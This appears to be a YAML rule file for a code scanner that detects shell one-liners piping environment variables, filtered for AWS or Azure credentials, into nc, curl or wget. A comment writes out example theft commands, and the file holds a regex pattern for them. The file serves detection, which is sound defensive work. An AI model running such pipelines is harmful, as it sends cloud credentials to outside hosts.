# The classic one-liner environment stealer: dump the process environment,
# select the credential variables, and pipe the result straight into a network
# client (`env | grep AWS | nc host port`, `env | grep AZURE | curl -d @- ...`).
#
# This is the shell-pipeline twin of the Node/Python `env -> POST` composites
# in combos.yaml, which only recognize language-level HTTP clients and so miss
# the shape entirely when the whole theft is one string handed to a shell.
defaults:
  platforms: [unix]
  for: [shell, python, javascript, typescript, ruby]
  attack: "T1552.001,T1041"
  mbc: E1020

traits:
  # Both the pipe into the network client and the environment source must sit
  # on one line, so a debug script that prints `env | grep AWS_REGION` and
  # curls something a few lines later cannot match: the environment has to be
  # feeding the socket, not merely be mentioned near one.
  - id: env-dump-piped-to-network-client
    desc: Environment dump piped to network client
    crit: suspicious
    conf: 0.93
    unless:
      - id: well-known/app/system/vsmux::vsmux-vscode-extension
      - id: well-known/tool/development/anthropic-claude-agent::claude-agent-sdk-js-marker
      - id: well-known/tool/detection/security-scanner-identity::ks-aur-scanner-source-context
      - id: metadata/package/testing/presence/harness::test-directory-path
    if:
      type: text
      regex: '(^|[\s;&|(])env\s*[|]([^\n]{0,60}[|])?\s*(nc|curl|wget)\s'

composite_rules:
  - id: env-secret-dump-piped-to-network-client
    desc: Env credential dump piped to a network client
    crit: hostile
    conf: 0.96
    near_lines: 1
    all:
      - id: env-dump-piped-to-network-client
      - id: micro-behaviors/os/env/vars/pipeline::shell-env-cloud-prefix-filter
